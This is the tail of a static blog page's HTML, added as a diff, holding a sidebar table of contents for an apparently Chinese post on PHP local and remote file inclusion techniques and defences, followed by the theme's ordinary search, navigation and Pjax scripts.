+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-File-Inclusion"><span class="nav-text">Local File Inclusion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="nav-text">防御策略</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-text">文件下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Direct-Local-Include"><span class="nav-text">1) Direct Local Include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-php-filter"><span class="nav-text">2) php:&#x2F;&#x2F;filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-proc-self-environ"><span class="nav-text">3) &#x2F;proc&#x2F;self&#x2F;environ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-Including-images"><span class="nav-text">4) Including images</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-Zip-and-Phar-wrappers"><span class="nav-text">5) Zip and Phar wrappers</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-File-Upload"><span class="nav-text">6) File Upload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-Session-Files"><span class="nav-text">7) Session Files</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-PHPInfo-Script"><span class="nav-text">8) PHPInfo Script</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-%E7%BB%93%E5%90%88phpinfo%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="nav-text">9) 结合phpinfo包含临时文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-Logs"><span class="nav-text">10) Logs</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Remote-File-Inclusion"><span class="nav-text">Remote File Inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Direct-Remote-Include"><span class="nav-text">1) Direct Remote Include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Data-text-plain"><span class="nav-text">2) Data:text&#x2F;plain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-php-input"><span class="nav-text">3) php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fighting-with-extensions"><span class="nav-text">Fighting with extensions</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Null-Bytes"><span class="nav-text">1) Null Bytes</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Truncation"><span class="nav-text">2) Truncation</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
